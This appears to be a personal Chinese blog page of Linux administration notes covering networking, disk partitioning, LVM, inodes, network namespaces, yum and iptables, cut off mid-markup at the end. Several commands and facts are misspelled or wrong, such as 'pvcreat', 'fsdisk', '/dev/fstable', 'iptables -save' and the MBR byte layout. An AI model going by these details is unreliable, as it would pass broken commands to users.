<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp IP&#x2F;hostname    &#x2F;&#x2F;访问ftp服务器<br>mls *.html -       &#x2F;&#x2F;显示远程主机上文件列表</p>
<h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><p>scp &#x2F;opt&#x2F;data.txt 192.168.1.101:&#x2F;opt&#x2F; <a href="https://将本地opt目录下的data文件发送到192.168.1.101服务器的opt目录下/">&#x2F;&#x2F;将本地opt目录下的data文件发送到192.168.1.101服务器的opt目录下</a>安全的拷贝</p>
<h1 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h1><h2 id="防火墙操作"><a href="#防火墙操作" class="headerlink" title="防火墙操作"></a>防火墙操作</h2><p>service iptables status      &#x2F;&#x2F;查看iptables服务的状态<br>service iptables start       &#x2F;&#x2F;开启iptables服务<br>service iptables stop        &#x2F;&#x2F;停止iptables服务<br>service iptables restart     &#x2F;&#x2F;重启iptables服务<br>chkconfig iptables off       &#x2F;&#x2F;关闭iptables服务的开机自启动<br>chkconfig iptables on        &#x2F;&#x2F;开启iptables服务的开机自启动<br>##centos7 防火墙操作<br>systemctl status firewalld.service     &#x2F;&#x2F;查看防火墙状态<br>systemctl stop firewalld.service       &#x2F;&#x2F;关闭运行的防火墙<br>systemctl disable firewalld.service    &#x2F;&#x2F;永久禁止防火墙服务<br>x</p>
<h2 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h2><p>hostnamectl set-hostname 主机名</p>
<h2 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h2><p>ifconfig</p>
<h2 id="修改IP"><a href="#修改IP" class="headerlink" title="修改IP"></a>修改IP</h2><p>修改网络配置文件，文件地址：&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p>
<p>主要修改以下配置：<br>TYPE&#x3D;Ethernet &#x2F;&#x2F;网络类型<br>BOOTPROTO&#x3D;static &#x2F;&#x2F;静态IP<br>DEVICE&#x3D;ens00 &#x2F;&#x2F;网卡名<br>IPADDR&#x3D;192.168.1.100 &#x2F;&#x2F;设置的IP<br>NETMASK&#x3D;255.255.255.0 &#x2F;&#x2F;子网掩码<br>GATEWAY&#x3D;192.168.1.1 &#x2F;&#x2F;网关<br>DNS1&#x3D;192.168.1.1 &#x2F;&#x2F;DNS<br>DNS2&#x3D;8.8.8.8 &#x2F;&#x2F;备用DNS<br>ONBOOT&#x3D;yes &#x2F;&#x2F;系统启动时启动此设置</p>
<p>修改保存以后使用命令重启网卡：service network restart</p>
<h2 id="配置映射"><a href="#配置映射" class="headerlink" title="配置映射"></a>配置映射</h2><p>修改文件： vi &#x2F;etc&#x2F;hosts<br>在文件最后添加映射地址，示例如下：<br>192.168.1.101  node1<br>192.168.1.102  node2<br>192.168.1.103  node3<br>配置好以后保存退出，输入命令：ping node1 ，可见实际 ping 的是 192.168.1.101。</p>
<h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><p>ps -ef &#x2F;&#x2F;查看所有正在运行的进程</p>
<h2 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h2><p>kill pid       &#x2F;&#x2F;杀死该pid的进程<br>kill -9 pid    &#x2F;&#x2F;强制杀死该进程</p>
<h2 id="查看连接"><a href="#查看连接" class="headerlink" title="查看连接"></a>查看连接</h2><p>ping IP        &#x2F;&#x2F;查看与此IP地址的连接情况<br>netstat -an    &#x2F;&#x2F;查看当前系统端口<br>netstat -antplu | grep 8080     &#x2F;&#x2F;查看指定端口</p>
<h2 id="快速清屏"><a href="#快速清屏" class="headerlink" title="快速清屏"></a>快速清屏</h2><p>ctrl+l &#x2F;&#x2F;清屏，往上翻可以查看历史操作</p>
<h2 id="远程主机"><a href="#远程主机" class="headerlink" title="远程主机"></a>远程主机</h2><p>ssh IP       &#x2F;&#x2F;远程主机，需要输入用户名和密码</p>
<h1 id="颜色与类型的关系"><a href="#颜色与类型的关系" class="headerlink" title="颜色与类型的关系"></a>颜色与类型的关系</h1><p><a href="Untitled%2089612a0e61964bd0bcf641f9d74c2bb9.csv">Untitled</a></p>
<p><a href="Untitled%20daabe5b96d5f4c8c86a5fe8a42c2f598.csv">Untitled</a></p>
<p><a href="https://www.jb51.net/article/174033.htm">linux中$符号的基础用法总结_Linux_脚本之家</a></p>
<p>!! 最后一条命令<br><code>!$</code> 将上一条命令的参数应用于这一条<br>^R 查找命令</p>
<p>su切换用户时加-与不加的区别<br>加-：会加载切换用户的shell环境，运行的的login shell 运行 &#x2F;etc&#x2F;profile &#x2F;etc&#x2F;bashrc  <del>&#x2F;.bashrc ~&#x2F;.bash_profile (</del>&#x2F;.bash_history-历史命令 <del>&#x2F;.bash_logout-可以写入命令在退出用户时执行)退出时运行<br>不加-：不会加载用户的shell环境，运行的是nologin shell &#x2F;etc&#x2F;bashrc ~&#x2F;.bashrc  (</del>&#x2F;bash_history ~&#x2F;bash_logout)退出时运行</p>
<p>ls | tee a.txt 与| a.txt的区别tee管道不会截流，命令结果仍然或输出到屏幕</p>
<p>&#x2F;etc&#x2F;profile &#x2F;&#x2F;系统启动的时候才执行一次，之后不再执行，其中主要定义一些环境变量</p>
<p>~&#x2F;.bashrc  &#x2F;&#x2F;当前用户每新开一个shell就执行一次 ，其中主要定义别名之类的信息</p>
<p>系统开机时首先去执行&#x2F;etc&#x2F;profile文件，然后根据其中的内容到&#x2F;etc&#x2F;profile.d&#x2F;中读取额外的设定文档。然后读取&#x2F;etc&#x2F;bashrc的内容。然后根据登录用户的信息去对应的家目录读取<del>&#x2F;.bash_profile，如果不能读取则去读取</del>&#x2F;.bash_login，如果仍不能读取则去读<del>&#x2F;.profile中的内容，这三个文件中的内容基本一致。然后读取</del>&#x2F;.bashrc中的内容<br><code>eject //弹出挂载的光盘</code></p>
<h2 id="shell-脚本中使用python脚本"><a href="#shell-脚本中使用python脚本" class="headerlink" title="shell 脚本中使用python脚本"></a><strong>shell 脚本中使用python脚本</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/python &lt;&lt;-<span class="string">a</span></span><br><span class="line"><span class="string">print(&quot;armandhe&quot;)</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line">\<span class="built_in">ls</span> //不使用别名输出，例中将运行结果将不显示颜色 </span><br><span class="line"><span class="built_in">unalias</span> <span class="built_in">ls</span> //取消<span class="built_in">ls</span>的别名</span><br></pre></td></tr></table></figure>

<p><code>echo -e &quot;\e[1;31m this is a test to change fg color \e[0m&quot; //30-37 前景色 echo -e &quot;\e[1;40m this is a test to change fg color \e[0m&quot; //40-47 背景色</code></p>
<p>.&#x2F;a.sh<br>bash a.sh<br>子shell执行<br>. a.sh<br>source a.sh<br>当前shell执行<br>^k &#x2F;&#x2F;删除光标后的内容<br>^a &#x2F;&#x2F;回到命令开头<br>^e &#x2F;&#x2F;回到命令结尾<br>^b &#x2F;&#x2F;光标向前移动一格<br>^n &#x2F;&#x2F;清空当前命令<br>^h &#x2F;&#x2F;退格删除<br>read -p “please type ip addr: “ ip &#x2F;&#x2F;提示用户输入<br>id username &#x2F;&#x2F;判断用户是否存在</p>
<p>$? &#x2F;&#x2F;上一条命令执行的结果 执行陈工为0</p>
<p>env &#x2F;&#x2F;显示当前所有的环境变量</p>
<p>expr $num1 + $num2    expr 1 + 2<br>[ 1 + 2 ]<br>echo $(($num1 + $num2))<br>echo $((num1 + num2))</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">url=[www.baidu.com.cn](https://www.notion.so/www.baidu.com.cn)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#*.&#125;</span> //baidu.com.cn 从前往后删除匹配部分，非贪婪匹配</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url##*.&#125;</span> //cn 从前往后删除匹配部分，贪婪匹配</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%.cn&#125;</span> // [www.baidu.com](https://www.notion.so/www.baidu.com) 从后往前删除匹配部分，非贪婪匹配</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%%.*&#125;</span> //www 从王往前删除匹配部分，贪婪匹配</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/c/C&#125;</span> //[www.baidu.Com.cn](https://www.notion.so/www.baidu.Com.cn) 内容替换替换单个</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url//c/C&#125;</span> //[www.baidu.Com.Cn](https://www.notion.so/www.baidu.Com.Cn) 内容替换，替换多个</span><br></pre></td></tr></table></figure>

<p>unset var<br>echo ${var-aaaa} &#x2F;&#x2F;变量未被定义，var的值被替换为aaaa</p>
<p>var&#x3D;1<br>echo ${var-aaaa} &#x2F;&#x2F;var有值，其值不能被替代</p>
<p>var&#x3D;<br>echo ${var-aaa} &#x2F;&#x2F;var被定义过，其值不可被提到</p>
<p>var&#x3D;<br>echo ${var:-aaaa} &#x2F;&#x2F;var被定义过，但为空，其值被替代为aaaa</p>
<p><code>+ :+ =  := ? :？</code></p>
<p>let i++<br>let ++i<br>let –i<br>let I–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125; <span class="comment">#集合</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> 2345</span><br><span class="line"><span class="keyword">done</span>   //循环执行五次</span><br><span class="line"></span><br><span class="line"><span class="built_in">date</span>）//在子shell中执行</span><br></pre></td></tr></table></figure>

<p>((1&lt;2)) &#x2F;&#x2F;使用&lt; &gt; 等符号进行比较<br>touch $(date +%F)_file.txt &#x2F;&#x2F;命令替换与&#96;&#96;效果一致<br>$((1+2))<br>test 1 -eq 2 &#x2F;&#x2F;条件测试<br>[ 1 -eq 2 ] &#x2F;&#x2F;条件测试<br><code>[[[www.baidu.com](https://www.notion.so/www.baidu.com) =~ *baidu]] //条件测试 正则比较未测试成功</code> 正则比较必须用这种格式<br>&#x3D;~ &#x2F;&#x2F;按照正则方式匹配<br>$[1 + 2] &#x2F;&#x2F;整数运算<br>{} &#x2F;&#x2F;集合{1..8}<br>${} &#x2F;&#x2F;使用变量，定界<br><code>export a=1 //环境变量</code></p>
<p>sh -vx a.sh &#x2F;&#x2F;以调试的方式执行<br>sh -n a.sh &#x2F;&#x2F;仅调试语法测试</p>
<p>seq 10 &#x2F;&#x2F;生成一个1-10的序列</p>
<p>seq 1 10 &#x2F;&#x2F;生成1-10的序列</p>
<p>seq 1 2 10 &#x2F;&#x2F;以2为步长生成1-10的序列</p>
<p>userdel -rf a &#x2F;&#x2F;删除用户及其家目录</p>
<h2 id="更改centos镜像源"><a href="#更改centos镜像源" class="headerlink" title="更改centos镜像源"></a>更改centos镜像源</h2><p>首先备份原镜像配置文件</p>
<p>cp &#x2F;etc&#x2F;yum.repos.d&#x2F;centos-base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;centos-base.repo.bak</p>
<p>cd到&#x2F;etc&#x2F;yum.repos.d</p>
<p>下载你的镜像配置文件</p>
<p>wget <a href="http://domain/">http://domain</a>  </p>
<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>apt-get install fcitx -y &#x2F;&#x2F;安装输入法框架</p>
<p>apt-get install fcitx-googlepinyin</p>
<p>reboot</p>
<p>搜索fcitx将谷歌拼音设置为首选输入法</p>
<h1 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h1><p><a href="https://www.runoob.com/linux/linux-filesystem.html">Linux 磁盘管理</a></p>
<p><a href="%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%2062b6eff0337a41abbeeec6c6025fb791.csv">磁盘管理</a></p>
<h1 id="磁盘管理-1"><a href="#磁盘管理-1" class="headerlink" title="磁盘管理"></a>磁盘管理</h1><h2 id="raid-独立磁盘冗余整列"><a href="#raid-独立磁盘冗余整列" class="headerlink" title="raid-独立磁盘冗余整列"></a>raid-独立磁盘冗余整列</h2><p>分为软件整列与硬件整列</p>
<p>raid0 </p>
<p>数据写入的时候，被分成N块，同时并发写入不同的磁盘，没有校验机制，一个磁盘损坏所有磁盘就算坏了，高效</p>
<p>raid1</p>
<p>数据被复制n份，同时写入不同的磁盘，速度慢</p>
<p>raid3</p>
<p>数据被分成n份写入，添加了校验机制，一块磁盘单独来保存校验信息，一块磁盘损坏可通过校验信息来回复。校验磁盘损坏后就失去了回复的能力</p>
<p>raid5</p>
<p>数据被分成n份写入，每一块磁盘中都包含了属于其他磁盘的校验信息，当一块磁盘损坏了，就可以根据其他磁盘回复数据</p>
<p>raid6</p>
<p>数据被分成n份写入，在raid5的基础上添加了双重校验功能，每一个磁盘都有了两份校验数据</p>
<p>raid10</p>
<p>先将数据复制两份，每一份再按照raid0的方式存储</p>
<p>磁盘</p>
<p>柱面 磁头 扇区 块 分区</p>
<p>分区 </p>
<p><strong>mbr</strong> ：4个分区，3个主分区+1个逻辑分区 扇区 512字节 0号扇区中包括226字节的bootloader 64字节的分区表，2字节的表值 一个分区占用16字节，故最多只能有4个分区，最多有2<strong>16*4个扇区，2</strong>16<em>512</em>4 字节的存储空间。</p>
<p>**gpt：**第一个扇区定义了分区的数量等信息，第二个扇区为分区表头，第三个扇区开始为分区表，gpt分区一般有32个扇区的分区表，一个扇区可以有4个分区信息，那么一个分区就有128位，故一共可以有128个分区，所以基本上不会有分区大小与分区数量的限制。</p>
<p>硬盘接口类型</p>
<p>ide sata scsi sas等接口</p>
<p>查看分区信息</p>
<p>partx &#x2F;dev&#x2F;sda &#x2F;&#x2F;</p>
<p>cat &#x2F;proc&#x2F;partitions &#x2F;&#x2F;显示分区信息</p>
<p>partprobe &#x2F;dev&#x2F;sda &#x2F;&#x2F;重新加载硬盘信息</p>
<p>linux vfs-虚拟文件系统。对底层文件系统的抽象，用户使用该文件系统操作文件</p>
<h2 id="硬盘分区步骤"><a href="#硬盘分区步骤" class="headerlink" title="硬盘分区步骤"></a>硬盘分区步骤</h2><p>分区</p>
<p>格式化文件系统</p>
<p>挂载：临时挂载，永久挂载-修改&#x2F;etc&#x2F;fstab</p>
<p>mount -a &#x2F;&#x2F;重读挂载表</p>
<h2 id="交换分区"><a href="#交换分区" class="headerlink" title="交换分区"></a>交换分区</h2><p>内存中不常用的数据可放在交换分区中，window中叫做虚拟内存</p>
<p>m &#x2F;&#x2F;查看帮助</p>
<p>fsdisk &#x2F;dev&#x2F;sda</p>
<p>分区</p>
<p>t  &#x2F;&#x2F; 输入分区编号为82，通看分区类型，82为交换分区</p>
<p>重新加载分区表 partprobe &#x2F;dev&#x2F;sda</p>
<p>mkswap &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;创建交换分区</p>
<p>swapon  &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;开启交换分区</p>
<p>swapoff &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;关闭交换分区</p>
<h2 id="磁盘挂载配置文件"><a href="#磁盘挂载配置文件" class="headerlink" title="磁盘挂载配置文件"></a>磁盘挂载配置文件</h2><p>进入&#x2F;dev&#x2F;fstable</p>
<p>&#x2F;dev&#x2F;mapper&#x2F;centos-root &#x2F; xfs defaults 0 0 </p>
<p>设备文件 挂载点 文件系统类型 挂载选项 检测顺序0表示不检测 转存</p>
<p>mount -a &#x2F;&#x2F;重读挂载表</p>
<h2 id="LVM-logic-volume-manager-逻辑卷管理器"><a href="#LVM-logic-volume-manager-逻辑卷管理器" class="headerlink" title="LVM-logic volume manager 逻辑卷管理器"></a>LVM-logic volume manager 逻辑卷管理器</h2><p>将不同的硬盘逻辑划分为不同的分区</p>
<p>pv-物理卷 整块物理硬盘或者他上面的分区</p>
<p>pe-物理区域  extent </p>
<p>vg-卷组</p>
<p>lv-逻辑卷</p>
<p>le 逻辑区域</p>
<p>卷组描述区域</p>
<h3 id="创建逻辑卷过程"><a href="#创建逻辑卷过程" class="headerlink" title="创建逻辑卷过程"></a>创建逻辑卷过程</h3><ol>
<li><p>创建物理卷</p>
<p> pvcreat &#x2F;dev&#x2F;sda1</p>
<p> pvcreat &#x2F;dev&#x2F;sda2</p>
</li>
<li><p>创建卷组</p>
<p> vgcreat volumegroupname &#x2F;dev&#x2F;sda{1,2}</p>
</li>
<li><p>创建逻辑卷</p>
<p> lvcreat -L|—size volumesize vgname -n lvname</p>
</li>
</ol>
<p>格式化逻辑卷</p>
<p>mkfs.ext4 &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>mkfs -t ext4 &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>挂载</p>
<p>mount &#x2F;dev&#x2F;vgname&#x2F;lvname 挂载点</p>
<p>扩展逻辑卷</p>
<p>lvextend -L +extendsize &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>扩展文件系统</p>
<p>resize2fs &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>扩展卷组</p>
<p>vgextend vgname &#x2F;dev&#x2F;sda3</p>
<p>制作快照分区</p>
<p>lvcreate -L lvsize -n snapshot-lvname -s(指定为快照卷) lvname</p>
<p>挂载快照卷</p>
<p>mount -r &#x2F;dev&#x2F;vgname&#x2F;lvname 挂载路径</p>
<h3 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h3><p><strong>备份类型</strong></p>
<p>冷备-离线备份</p>
<p>温备-只读备份</p>
<p>热备-读写备份</p>
<p>几乎热备</p>
<p>快照卷的大小是数据变化的大小</p>
<p>拍摄了快照之后，当原卷发生变化的时候，快照将获取变化信息，并进行写入快照。写时复制。</p>
<p><strong>备份过程-几乎热备</strong></p>
<p>首先锁定要备份的文件，然后拍摄快照，然后解锁，然后根据快照对数据进行备份。</p>
<h2 id="inode-索引节点"><a href="#inode-索引节点" class="headerlink" title="inode-索引节点"></a>inode-索引节点</h2><p><a href="https://blog.csdn.net/xuz0917/article/details/79473562">Linux的inode的理解_猿子-CSDN博客_inode</a></p>
<p>磁盘的最小存储单位叫做扇区，操作系统的最小操作单位叫做块，一个块由8个扇区组成。一个扇区512bytes，所以一个块4k</p>
<p>文件数据存储在块block中，其他如时间、创建者等信息储存在另一个区域，这个存储文件元信息的区域就叫做inode，即索引节点。</p>
<p><strong>其中包含</strong></p>
<p>文件的大小</p>
<p>uid</p>
<p>gid</p>
<p>权限</p>
<p>时间戳：访问、修改、inode变动时间</p>
<p>links</p>
<p>inode号码</p>
<p>blocks数</p>
<p>ioblock块大小</p>
<p>设备号码</p>
<p>一个inode节点的大小一般是128或者256字节，在格式化的时候一般时每1kB或者2kB就设置一个inode节点。</p>
<p>每个inode都有一个号码，操作系统通过inode号码来识别不同的文件而不是文件名</p>
<p>ls -i a.txt&#x2F;&#x2F;查看inode信息</p>
<p>df -i &#x2F;&#x2F;查看磁盘inode信息</p>
<p>stat a.txt &#x2F;&#x2F;查看文件元数据</p>
<p><strong>普通文件</strong></p>
<p>系统通过文件名找到文件的inode号码，然后哦那个过inode号码获取inode信息，根据inode信息，找到数据所在的block,从而获取信息</p>
<p><strong>目录文件</strong></p>
<p>目录文件中是一系列目录项的列表，每个目录项里包括两部分，所包含的文件名以及文件名对应的inode号码</p>
<p><strong>硬链接</strong></p>
<p>源文件与目标文件都指向同一个inode,删除一个文件并不会整的删除文件信息，只有当所有的文件名都被删除后，文件才真正被删除。inode节点信息中的links就表示指向同一文件的文件名的个数。</p>
<p>创建目录时会生成两个目录项.和..。所以任何一个目录的连接数都等于2加上他的子目录的总数包括隐藏目录</p>
<p><strong>软连接</strong></p>
<p>软连接目标文件的文件内容是指向文件的路径，当系统访问目标文件的时候，目标会见会将访问者导向前一文件。</p>
<h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><p>ifconfig -a &#x2F;&#x2F;显示所有的网卡，包括down掉得</p>
<p>ifconig ens33 ip&#x2F;prefix broadcast down&#x2F;up</p>
<p>ifconfig ens33:0 ip&#x2F;prefix up|down</p>
<p>ifconfig ens33 hw ether macaddr &#x2F;&#x2F;修改mac次啊hi</p>
<p>ifconfig ens33 add ipv6&#x2F; 64</p>
<p>ifconfig ens33 arp</p>
<p>ifconfig ens33 -arp</p>
<p>ifconfig ens33 mtu 1500</p>
<p>ifconfig ens33 up</p>
<p>ifconfig ens33 down</p>
<p>route -n &#x2F;&#x2F;数字形式显示<br>-net &#x2F;&#x2F;网络路由</p>
<p>-host &#x2F;&#x2F;主机路由</p>
<p>route add -net 100.100.100.0&#x2F;24 gw net_skip_addr</p>
<p>route add -host 100.100.100.100 dev 网卡名</p>
<p>route add default gw net_skip_addr</p>
<p>route add -net 0.0.0.0&#x2F;0 gw net_skip_addr</p>
<p>route del -net 网段 netmask 子网掩码 reject &#x2F;&#x2F;设置目标网段不可达</p>
<p>del &#x2F;&#x2F;删除</p>
<p>&#x2F;etc&#x2F;resolv.conf &#x2F;&#x2F;域名地址</p>
<p>netstat -r &#x2F;&#x2F;查询路由</p>
<p>netstat -n &#x2F;&#x2F;不解析成主机名</p>
<p>netstat &#x2F;&#x2F;解析成主机名</p>
<p>netstat -tn &#x2F;&#x2F;tcp</p>
<p>netstat -un &#x2F;&#x2F;udp</p>
<p>netstat -ln &#x2F;&#x2F;监听状态</p>
<p>netstat -a &#x2F;&#x2F;监听状态与建立连接状态</p>
<p>netstat -p &#x2F;&#x2F;启动该端口的进程</p>
<p>curl <a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p>ab -n 10000 -c 100 <a href="http://127.0.0.1/">http://127.0.0.1/</a> &#x2F;&#x2F;压力测试，</p>
<p>ip link show</p>
<p>ip link set ens33 up</p>
<p>ip link set ens33 down</p>
<p>ip link set ens33 promisc on</p>
<p>ip link set ens33 promisc off</p>
<p>ip link set ens33 txqueuelen </p>
<p>ip link set ens33 mtu 1500</p>
<p>ip add show</p>
<p>ip addr add ipaddr&#x2F;prefix dev ens33</p>
<p>ip addr del ipaddr&#x2F;prefis dev ens33</p>
<p>ip route show</p>
<p>ip route add 192.168.10.0&#x2F;24 via 192.168.10.254 dev ens33</p>
<p>ip route add default via net_skip_addr &#x2F;&#x2F;添加默认路由</p>
<p>ip route del 192.168.10.0&#x2F;24 dev ens33 &#x2F;&#x2F;删除路由</p>
<p>ip route del 192.168.10.0&#x2F;24 &#x2F;&#x2F;删除网关</p>
<h2 id="网络命名空间"><a href="#网络命名空间" class="headerlink" title="网络命名空间"></a>网络命名空间</h2><p>所谓命名空间可以理解未更为抽象的作用域，他将不同的区域隔离开来，两个区域中相互之间互不影响，再不同的网络命名空间中有独立的协议栈、网络设备、防火墙等。</p>
<p>ip netns add netnamespace_name  &#x2F;&#x2F;添加一个命名空间</p>
<p>ip netns set netnamespce_name netnid &#x2F;&#x2F;未命名空间设置id</p>
<p>ip netns del netnamespace_nam &#x2F;&#x2F;删除</p>
<p>ip netns -all del &#x2F;&#x2F;删除所有</p>
<p>ip netns exec netnamespace_name command &#x2F;&#x2F;再网络命名空间中执行命令</p>
<p>ip netns -all exec command &#x2F;&#x2F;再所有的命名空间中执行命令</p>
<p>ip netns list &#x2F;&#x2F;列出所哟䣌命名空间</p>
<p>ip netns identifu pid &#x2F;&#x2F;某一个进程的netns</p>
<p>ip netns monitor &#x2F;&#x2F;监控对netns的操作</p>
<p>在网络命名空间中虚拟网卡是成对出现的，一个存在命名空间内，一个存在于全局命名空间内，两者将网络命名空间与外部命名空间连接了起来。</p>
<p>ip link add veth0 type veth peer name veth1 &#x2F;&#x2F;创建一对虚拟网卡</p>
<p>ip link set veth1 netns ns1 &#x2F;&#x2F;将veth1移动到ns1命名空间中去</p>
<p>ip netns exec ns1 ip addr add 192.168.1.1&#x2F;24 dev veth1 &#x2F;&#x2F;为veth1配置ip</p>
<p>ip netns exec ns1 ip link set veth1 up &#x2F;&#x2F;开启veth1</p>
<p>ip netns exec ns1 ip link set lo ip &#x2F;&#x2F;开启环回网卡,此时可以ping 通自己</p>
<p>ip addr add 192.168.1.2&#x2F;24  dev veth0&#x2F;&#x2F;配置veth0的ip</p>
<p>ip link set veth0 up &#x2F;&#x2F;开启veth0</p>
<p>ip netns exec ns1 ip route add default via 192.168.1.1 &#x2F;&#x2F;配置默认路由 &#x2F;&#x2F;此时可以和本地主机通信，但不能和其他主机通信,还需要配置ip转发</p>
<p>cat &#x2F;proc&#x2F;sus&#x2F;net&#x2F;ipv4&#x2F;ip_forward &#x2F;&#x2F;查看是否开启了ip转发，值为1表示开启，值为0表示关闭</p>
<p>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward &#x2F;&#x2F;配置转发使能</p>
<p>iptables -F FORWARD</p>
<p>iptables -t nat -F &#x2F;&#x2F;刷新forward规则</p>
<p>iptables -t nat -L -n &#x2F;&#x2F;刷新nat规则</p>
<p>iptables -t nat -A POSTROUTING -s 192.168.1.0&#x2F;255.255.255.0 -o ens33 -j MASQUERADE &#x2F;&#x2F;使能ip伪装</p>
<p>iptables -A FORWARD -i ens33 -o veth0 -j ACCEPT</p>
<p>iptables -A FORWARD -i veth0 -o ens33 -j ACCEPT</p>
<p><img src="/archives/d0edc1ed/Untitled.png"></p>
<p>&#x2F;etc&#x2F;sysconfig&#x2F;network &#x2F;&#x2F;配置本机的主机名 ，HOSTNAME&#x3D;armandhe</p>
<p>&#x2F;etc&#x2F;hostname &#x2F;&#x2F;配置主机名，armandhe</p>
<h1 id="软件包管理"><a href="#软件包管理" class="headerlink" title="软件包管理"></a>软件包管理</h1><p><strong>yum配置文件</strong></p>
<p>[id]</p>
<p>name&#x3D;自定义名称</p>
<p>baseurl&#x3D;仓库路径</p>
<pre><code>         file:///mnt/cdrom //本地仓库
</code></pre>
<p>enabled&#x3D;是否可用，0，1</p>
<p>gpgcheck&#x3D;是否开启校验 0，1</p>
<p>一个yum仓库中必须要有一个repodata 文件，其中定义了所有rpm包的信息</p>
<p>yum list &#x2F;&#x2F;列出仓库中所有的包</p>
<p>yum info 包名 &#x2F;&#x2F;显示包信息</p>
<p>yum groupinstall 包组</p>
<p>yum repolist 列出仓库列表</p>
<p>yum install 包名</p>
<p>yum update package_name</p>
<p>yum remove package_name</p>
<p>yum deplist package_name &#x2F;&#x2F;查看包的依赖关系</p>
<p>yum reinstall package_name &#x2F;&#x2F;重新安装一个包</p>
<p>yum groupremove 包组名 &#x2F;&#x2F;删除包组</p>
<p>yum search string &#x2F;&#x2F;根据指定字符串搜索包</p>
<p>yum -y groupinstall “Development Tools” &#x2F;&#x2F;安装常用开发工具</p>
<p><strong>源码安装</strong></p>
<p>在源码目录执行 .&#x2F;configure —prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;software_name <a href="//prefix">&#x2F;&#x2F;prefix</a> 指定安装路径。执行该命令会生成makefile文件，该文件中包含编译顺序等信息。configure会检查当前环境，是否有cc gcc等。cc是unix的已收费，gcc更加强大，linux中的cc是gcc的符号连接。</p>
<p>make &#x2F;&#x2F;编译源码</p>
<p>make install &#x2F;&#x2F;安装软件</p>
<p>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;httpd.service <a href="//systemcel">&#x2F;&#x2F;systemctl</a> 执行配置文件</p>
<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><h2 id="防火墙分类"><a href="#防火墙分类" class="headerlink" title="防火墙分类"></a>防火墙分类</h2><p>主机防火墙</p>
<p>网络防火墙</p>
<p>软甲防火墙</p>
<p>硬件防火墙</p>
<p>4层防火墙 &#x2F;&#x2F;基于端口，ip等</p>
<p>7层防火墙 &#x2F;&#x2F;应用层防火墙，基于7层协议，waf</p>
<p>linux的防火墙，是通过底层的netfilter来过滤数据的，iptables与firewalld是用来配置i过滤规则的。</p>
<h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><h2 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h2><p><strong>四表</strong></p>
<p>raw &#x2F;&#x2F;数据追踪</p>
<p>mangle &#x2F;&#x2F;拆解报文，重新封装</p>
<p>nat  </p>
<p>filter</p>
<p><strong>五链</strong></p>
<p>input &#x2F;&#x2F;入站规则</p>
<p>forward &#x2F;&#x2F;转发链</p>
<p>output &#x2F;&#x2F;出站规则</p>
<p>prerouting &#x2F;&#x2F;路由之前对数据进行改变，对目标地址做转换</p>
<p>postrouting &#x2F;&#x2F;路由之后对数据进行改变，对源ip地址做转换</p>
<p><strong>数据过链顺序</strong></p>
<p>流入：prerouting —&gt; input </p>
<p>流出：ouput —&gt; postrouting</p>
<p>转发：prerouting —&gt; forward —&gt; postrouting</p>
<p><strong>FILTER表</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t filter -nvL</span><br><span class="line">iptables -t filter | FILTER  2 -s 0.0.0.0/0 -d 0.0.0.0/0 -j DROP -p tcp</span><br><span class="line">iptables -D FORWARD 2 <span class="comment">#删除forward链第二条</span></span><br><span class="line">iptables -F FORWARD <span class="comment">#删除forward链中所有规</span></span><br><span class="line">iptables -P FORWARD DROP|ACCEPT <span class="comment">#设置默认策略</span></span><br><span class="line">iptables -save &gt; /tmp/a.txt <span class="comment">#导出规则</span></span><br><span class="line">iptables -restore &lt; /tmp/a.txt <span class="comment">#导入规则</span></span><br><span class="line">service iptables save <span class="comment">#保存当前规则为默认规则</span></span><br><span class="line"></span><br><span class="line">target: accept|drop|reject|<span class="built_in">log</span> <span class="comment">#大写 放行|丢弃|拒绝|记录日志</span></span><br><span class="line">	-I : insert <span 